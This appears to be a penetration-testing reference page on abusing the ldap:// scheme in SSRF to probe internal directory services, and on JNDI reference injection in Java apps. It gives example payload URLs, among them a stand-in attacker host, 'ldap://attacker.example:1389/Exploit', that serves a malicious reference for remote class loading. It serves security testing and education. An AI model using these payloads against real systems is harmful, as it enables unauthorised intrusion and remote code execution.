---
title: "LDAP scheme SSRF and JNDI reference abuse"
description: "The ldap:// scheme reaches internal directory services, and a Java client that resolves an attacker LDAP URL through JNDI can be served a reference object that drives further code loading."
keywords:
  - ldap scheme
  - ldap://
  - JNDI reference
  - internal directory
  - Java naming
  - 389
---

# LDAP

`ldap://` (and `ldaps://` on 636) addresses a directory service. As an SSRF scheme it reaches an internal LDAP server the attacker could not contact directly, and on Java stacks it connects to the broader hazard of JNDI reference resolution.

## Reaching internal directories

The URL carries host, port, and optionally a base DN and search terms:

```
ldap://127.0.0.1:389/
ldap://10.0.0.5:389/dc=corp,dc=local
ldaps://internal-dc.corp:636/
```

Pointed at an internal directory, the request connects and, depending on the client, performs an anonymous bind or a search, returning directory data or an error that confirms the service. Even without readable results, the connection behavior is a precise [Port](../authority/port.md) oracle for 389 and 636.

## JNDI reference objects on Java

The sharper risk is a Java application that resolves an attacker-supplied `ldap://` URL through JNDI (for example a naming lookup whose name is influenced by input). The attacker runs an LDAP server that answers the lookup with a **reference** entry pointing at a remote object. When the vulnerable client processes that reference, it follows the pointer and loads the referenced object, turning a naming lookup into attacker-controlled object instantiation inside the JVM:

```
ldap://attacker.example:1389/Exploit
```

The application performs the lookup against the attacker's server, receives the crafted reference, and resolves it. The mechanism is the directory client trusting a reference response to tell it what to load, so the payoff ranges from loading an attacker class to deserialization of an attacker-supplied object, depending on the client configuration.

## When to use it

Use `ldap://` to reach and fingerprint internal directory services, and treat an input that flows into a Java JNDI lookup as the high-value case, where the scheme is the delivery path for a reference that escalates beyond request forgery. Where the client is not Java or does not use JNDI, `ldap://` remains a directory-reach and port-probe primitive.

## Tools

- **curl**: manual `ldap://` probing to reach and fingerprint an internal directory service.
- **interactsh**: open-source out-of-band interaction server to catch a JNDI lookup against a controlled host.
- Manual testing with Burp Repeater and crafted payloads.

## References

- [OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
